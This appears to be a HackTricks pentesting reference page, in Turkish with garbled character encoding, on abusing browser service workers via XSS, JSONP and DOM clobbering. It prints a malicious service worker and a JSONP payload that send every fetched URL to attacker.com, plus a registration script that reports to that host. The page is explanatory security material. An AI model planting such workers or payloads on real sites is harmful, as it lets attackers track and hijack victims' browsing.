# Hizmet Ä°ÅŸÃ§ilerini KÃ¶tÃ¼ye Kullanma



<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sÄ±fÄ±rdan kahraman olmaya kadar AWS hackleme Ã¶ÄŸrenin!</summary>

* **Bir siber gÃ¼venlik ÅŸirketinde mi Ã§alÄ±ÅŸÄ±yorsunuz? Åirketinizin HackTricks'te reklamÄ±nÄ± gÃ¶rmek ister misiniz? ya da PEASS'Ä±n en son sÃ¼rÃ¼mÃ¼ne eriÅŸmek veya HackTricks'i PDF olarak indirmek ister misiniz? [ABONELÄ°K PLANLARI](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family)
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nleri**](https://peass.creator-spring.com)'nÄ± edinin
* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) **Discord grubuna** katÄ±lÄ±n veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n veya **Twitter** ğŸ¦[**@carlospolopm**](https://twitter.com/hacktricks_live)'u takip edin.
* **Hacking pÃ¼f noktalarÄ±nÄ±zÄ± gÃ¶ndererek** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **ve** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **Ã¼zerinden PR gÃ¶nderin.**

</details>

## Temel Bilgiler

Bir **hizmet iÅŸÃ§isi**, tarayÄ±cÄ±nÄ±z tarafÄ±ndan arka planda Ã§alÄ±ÅŸtÄ±rÄ±lan, herhangi bir web sayfasÄ±ndan baÄŸÄ±msÄ±z olarak Ã§alÄ±ÅŸan, web sayfasÄ± veya kullanÄ±cÄ± etkileÅŸimi gerektirmeyen Ã¶zellikleri etkinleÅŸtiren ve dolayÄ±sÄ±yla **Ã§evrimdÄ±ÅŸÄ± ve arka plan iÅŸleme** yeteneklerini artÄ±ran bir betiktir. Hizmet iÅŸÃ§ileri hakkÄ±nda detaylÄ± bilgiye [buradan](https://developers.google.com/web/fundamentals/primers/service-workers) ulaÅŸÄ±labilir. SavunmasÄ±z bir web alanÄ± iÃ§inde hizmet iÅŸÃ§ilerini istismar ederek, saldÄ±rganlar, o alan iÃ§indeki tÃ¼m sayfalarla kurbanÄ±n etkileÅŸimini ele geÃ§irebilirler.


### Varolan Hizmet Ä°ÅŸÃ§ilerini Kontrol Etme

Varolan hizmet iÅŸÃ§ileri, **GeliÅŸtirici AraÃ§larÄ±**'ndaki **Uygulama** sekmesindeki **Hizmet Ä°ÅŸÃ§ileri** bÃ¶lÃ¼mÃ¼nde kontrol edilebilir. BaÅŸka bir yÃ¶ntem ise daha detaylÄ± bir gÃ¶rÃ¼nÃ¼m iÃ§in [chrome://serviceworker-internals](https://chromium.googlesource.com/chromium/src/+/main/docs/security/chrome%3A/serviceworker-internals) adresini ziyaret etmektir.

### Ä°tme Bildirimleri

**Ä°tme bildirimi izinleri**, bir **hizmet iÅŸÃ§isinin** doÄŸrudan kullanÄ±cÄ± etkileÅŸimi olmadan sunucu ile iletiÅŸim kurma yeteneÄŸini etkiler. Ä°zinler reddedildiÄŸinde, sÃ¼rekli bir tehdit oluÅŸturma potansiyelini sÄ±nÄ±rlar. Tersine, izinler verildiÄŸinde, gÃ¼venlik risklerini artÄ±rarak potansiyel saldÄ±rÄ±larÄ±n alÄ±nmasÄ±na ve yÃ¼rÃ¼tÃ¼lmesine olanak tanÄ±r.

## SaldÄ±rÄ± Bir Hizmet Ä°ÅŸÃ§isi OluÅŸturma

Bu zafiyeti sÃ¶mÃ¼rmek iÃ§in ÅŸunlarÄ± bulmanÄ±z gerekmektedir:

* Sunucuya **keyfi JS** dosyalarÄ± yÃ¼klemek iÃ§in bir yol ve yÃ¼klenen JS dosyasÄ±nÄ±n hizmet iÅŸÃ§isini yÃ¼klemek iÃ§in bir **XSS** bulun
* **ManipÃ¼le edebileceÄŸiniz (keyfi JS kodu ile)** savunmasÄ±z bir JSONP isteÄŸi ve bir **XSS** ile bu isteÄŸi **yÃ¼kleyebileceÄŸiniz bir JSONP**'ye sahip olun ve kÃ¶tÃ¼ niyetli bir hizmet iÅŸÃ§isi yÃ¼kleyecek bir yÃ¼k oluÅŸturun.

AÅŸaÄŸÄ±daki Ã¶rnekte, `fetch` etkinliÄŸini dinleyecek ve her alÄ±nan URL'yi saldÄ±rganÄ±n sunucusuna gÃ¶nderecek yeni bir hizmet iÅŸÃ§isi **kaydetmek** iÃ§in gereken kodu sunacaÄŸÄ±m:
```javascript
self.addEventListener('fetch', function(e) {
e.respondWith(caches.match(e.request).then(function(response) {
fetch('https://attacker.com/fetch_url/' + e.request.url)
});
```
Ve aÅŸaÄŸÄ±daki kod, iÅŸÃ§iyi kaydedecek olan kodu (XSS'yi kÃ¶tÃ¼ye kullanarak yÃ¼rÃ¼tebileceÄŸiniz kod) gÃ¶sterecektir. Bu durumda, saldÄ±rganÄ±n sunucusuna bir GET isteÄŸi gÃ¶nderilecek ve hizmet iÅŸÃ§isinin kaydÄ±nÄ±n baÅŸarÄ±lÄ± olup olmadÄ±ÄŸÄ± bildirilecektir:
```javascript
<script>
window.addEventListener('load', function() {
var sw = "/uploaded/ws_js.js";
navigator.serviceWorker.register(sw, {scope: '/'})
.then(function(registration) {
var xhttp2 = new XMLHttpRequest();
xhttp2.open("GET", "https://attacker.com/SW/success", true);
xhttp2.send();
}, function (err) {
var xhttp2 = new XMLHttpRequest();
xhttp2.open("GET", "https://attacker.com/SW/error", true);
xhttp2.send();
});
});
</script>
```
Vulnerable JSONP ucuza kullanÄ±ldÄ±ÄŸÄ±nda deÄŸeri `var sw` iÃ§ine koymalÄ±sÄ±nÄ±z. Ã–rneÄŸin:
```javascript
var sw = "/jsonp?callback=onfetch=function(e){ e.respondWith(caches.match(e.request).then(function(response){ fetch('https://attacker.com/fetch_url/' + e.request.url) }) )}//";
```
**Hizmet Ä°ÅŸÃ§ilerini** istismar etmek iÃ§in **C2** adlÄ± [**Shadow Workers**](https://shadow-workers.github.io) adlÄ± bir **hizmet iÅŸÃ§ilerine Ã¶zgÃ¼** bir araÃ§ vardÄ±r ki bu zayÄ±flÄ±klarÄ± istismar etmek iÃ§in oldukÃ§a faydalÄ± olacaktÄ±r.

**24 saatlik Ã¶nbellek yÃ¶nergesi**, bir XSS zayÄ±flÄ±ÄŸÄ± dÃ¼zeltmesinden sonra kÃ¶tÃ¼ amaÃ§lÄ± veya tehlikeli bir **hizmet iÅŸÃ§isinin (SW)** Ã¶mrÃ¼nÃ¼ en fazla 24 saatle sÄ±nÄ±rlar, Ã§evrimiÃ§i istemci durumunu varsayarsak. ZayÄ±flÄ±ÄŸÄ± en aza indirmek iÃ§in site iÅŸletmecileri SW betiÄŸinin Zaman-CanlÄ±lÄ±ÄŸÄ±nÄ± (TTL) dÃ¼ÅŸÃ¼rebilir. GeliÅŸtiricilere ayrÄ±ca hÄ±zlÄ± devre dÄ±ÅŸÄ± bÄ±rakma iÃ§in bir [**hizmet iÅŸÃ§isi kill-switch**](https://stackoverflow.com/questions/33986976/how-can-i-remove-a-buggy-service-worker-or-implement-a-kill-switch/38980776#38980776) oluÅŸturmalarÄ± Ã¶nerilir.

## DOM Clobbering aracÄ±lÄ±ÄŸÄ±yla SW'de `importScripts`'in KÃ¶tÃ¼ye KullanÄ±mÄ±

Bir Hizmet Ä°ÅŸÃ§isinden Ã§aÄŸrÄ±lan **`importScripts`** iÅŸlevi, **farklÄ± bir etki alanÄ±ndan bir betiÄŸi iÃ§e aktarabilir**. Bu iÅŸlev, bir saldÄ±rganÄ±n **deÄŸiÅŸtirebileceÄŸi bir parametre** kullanÄ±larak Ã§aÄŸrÄ±ldÄ±ÄŸÄ±nda, saldÄ±rganÄ±n **kendi etki alanÄ±ndaki bir JS betiÄŸini iÃ§e aktarmasÄ±na** ve XSS almasÄ±na olanak tanÄ±r.

**Bu, CSP korumalarÄ±nÄ± bile atlar.**

**Ã–rnek zayÄ±f kod:**

* **index.html**
```html
<script>
navigator.serviceWorker.register('/dom-invader/testcases/augmented-dom-import-scripts/sw.js' + location.search);
// attacker controls location.search
</script>
```
* **sw.js**
```javascript
const searchParams = new URLSearchParams(location.search);
let host = searchParams.get('host');
self.importScripts(host + "/sw_extra.js");
//host can be controllable by an attacker
```
### DOM Clobbering ile

DOM Clobbering'in ne olduÄŸu hakkÄ±nda daha fazla bilgi iÃ§in ÅŸu baÄŸlantÄ±ya bakÄ±n:

{% content-ref url="dom-clobbering.md" %}
[dom-clobbering.md](dom-clobbering.md)
{% endcontent-ref %}

EÄŸer SW'nin **`importScripts`** Ã§aÄŸrÄ±sÄ±nÄ± yapmak iÃ§in kullandÄ±ÄŸÄ± URL/domain, **bir HTML Ã¶ÄŸesinin iÃ§indeyse**, bu URL'yi **DOM Clobbering aracÄ±lÄ±ÄŸÄ±yla deÄŸiÅŸtirmek mÃ¼mkÃ¼ndÃ¼r** ve SW'nin **kendi alanÄ±nÄ±zdan bir betik yÃ¼klemesini saÄŸlamak mÃ¼mkÃ¼ndÃ¼r**.

Bunun bir Ã¶rneÄŸi iÃ§in referans baÄŸlantÄ±sÄ±na bakÄ±n.

## Referanslar

* [https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering](https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering)

<details>

<summary><strong>SÄ±fÄ±rdan kahraman olmak iÃ§in AWS hacklemeyi Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* **Bir **cybersecurity ÅŸirketinde mi Ã§alÄ±ÅŸÄ±yorsunuz**? **Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek ister misiniz**? ya da **PEASS'Ä±n en son sÃ¼rÃ¼mÃ¼ne eriÅŸmek veya HackTricks'i PDF olarak indirmek ister misiniz**? [**ABONELÄ°K PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini alÄ±n**](https://peass.creator-spring.com)
* **KatÄ±lÄ±n** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya beni **Twitter** ğŸ¦[**@carlospolopm**](https://twitter.com/hacktricks_live)** takip edin**.
* **Hacking pÃ¼f noktalarÄ±nÄ±zÄ± paylaÅŸÄ±n, PR'lar gÃ¶ndererek** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **ve** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **takip edin**.

</details>
